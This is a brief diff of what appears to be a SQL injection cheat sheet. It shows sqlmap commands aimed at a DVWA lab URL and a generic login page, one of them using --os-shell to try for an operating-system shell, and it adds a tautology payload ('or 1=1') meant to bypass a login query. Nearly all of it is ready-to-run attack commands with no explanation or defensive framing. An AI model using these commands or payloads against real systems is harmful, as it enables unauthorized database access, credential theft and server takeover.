@@ -88,3 +88,7 @@ sqlmap.py --url="http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
 
 sqlmap.py --url="http://target.com/login.asp" --data="txtLoginID=shrikant&txtPassword=password&cmdSubmit=Login" 
 --os-shell
+------------------------------------------------------------------------------------------------------
+
+SELECT * FROM login WHERE id = 1 or 1=1 AND user LIKE "%root%"
+
